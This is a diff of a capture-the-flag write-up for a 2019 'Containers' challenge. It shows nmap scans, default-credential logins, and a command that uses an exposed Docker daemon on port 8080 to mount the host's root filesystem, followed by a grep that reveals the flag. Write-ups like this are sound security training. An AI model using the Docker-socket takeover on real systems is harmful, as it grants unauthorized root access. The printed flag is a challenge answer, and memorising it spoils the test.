@@ -1,7 +1,12 @@
 # Containers
 
+## Challenge
+
 Please assess the security of our new web app. The staging environment for our new app is on: 10.0.111.[100 + your_team_number] 
 
+## Solution
+
+We were just given an IP address, so let's see which ports are open.
 
 ```bash
 nmap -sV --script=http-php-version -Pn 10.0.106.6 --dns-servers 192.168.100.1
@@ -19,6 +24,18 @@ PORT     STATE  SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 119.35 seconds
 ```
 
+Visiting `$IP:8000` takes us to a portal with a login page
+- admin:admin combo logs us in but flag server is apparently down
+- root:root combo logs us in but flag server is apparently down
+- Attempted various types of SQL injection. Web App does not appear to be vulnerable to SQL injection attacks
+- OWASP hints at no viable exploits either
+
+Visiting `$IP:8080` responds with a json string `{"message":"page not found"}`
+- No matter which HTTP Method
+- netcat doesn't respond
+
+
+Let's find out more about these open ports, let's grab the banners.
 
 ```bash
 (env-py2) [localhost tmctf2019-finals]$ nmap -sV -sC -Pn 10.0.111.106 --dns-servers 192.168.6.1                         
@@ -56,11 +73,19 @@ PORT     STATE  SERVICE    VERSION
 |_http-title: Site doesn't have a title (application/json).
 ```
 
+Turns out port 8080 is a docker proxy. If that's an open Docker daemon socket, we could use it to run containers with root access on the host. Let's try.
+
 ```bash
-DOCKER_HOST=tcp://10.0.111.106:8080 docker run -it -v /:/app ubuntu:latest
+(env-py2) [localhost tmctf2019-finals]$ DOCKER_HOST=tcp://10.0.111.106:8080 docker run -it -v /:/app ubuntu:latest
 ```
+
+It worked, so let's do an exhaustive search for the flag.
 
 ```bash
 $> grep -ir "TMCTF" /
 /home/ctf/container-bridge/populate.py:    flag = 'TMCTF{muggedby2candies!}'
 ```
+
+## Flag
+
+`TMCTF{muggedby2candies!}`
